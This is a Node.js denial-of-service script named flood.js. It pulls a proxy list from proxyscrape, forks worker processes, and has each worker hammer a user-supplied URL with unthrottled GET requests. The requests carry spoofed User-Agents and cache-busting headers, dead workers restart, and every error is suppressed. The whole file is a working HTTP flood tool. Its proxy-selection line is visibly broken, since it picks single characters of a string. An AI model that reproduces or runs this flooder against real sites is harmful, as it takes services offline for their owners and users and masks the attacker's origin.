require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request');
const axios = require('axios');
const fs = require('fs');
const cluster = require('cluster');
const fakeUa = require('fake-useragent');

async function main_processing() {
	if (process.argv.length != 4) {
		console.log('Usage : node flood.js <URL> <THREADS>');
	} else {
		target = process.argv[2]
		threads = process.argv[3]
		
		const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all');
		var proxies = proxyscrape_http.data;
		fs.writeFile('proxies.txt', proxies, (err) => {
			if (err) {
				console.error(err);
				return
			}
		});
		var fileProxies = fs.readFileSync('proxies.txt', 'utf-8');
		
		function run() {
			var proxy = fileProxies[Math.floor(Math.random() * fileProxies.length)];
			var proxiedRequest = request.defaults({'proxy': 'http://'+proxy});
			var config = {
				method: "get",
				url: target,
				headers: {
					'Cache-Control': 'no-cache',
					'User-Agent': fakeUa()
				}
			}
			proxiedRequest(config, function (error, response) {
				console.log(response.statusCode,"HTTP_PROXY");
			});
		}
		function thread(){
			setInterval(() => {
				run();
			});
		}
		async function main() {
			if (cluster.isMaster) {
				for (let i = 0; i < threads; i++) {
					cluster.fork();
					console.log(`Starting Requests HTTP ${i}`);
				}
				cluster.on('exit', function(){
					cluster.fork();
				});
			} else {
				thread();
			}
		}
		main();
					
	}
}

process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
main_processing();
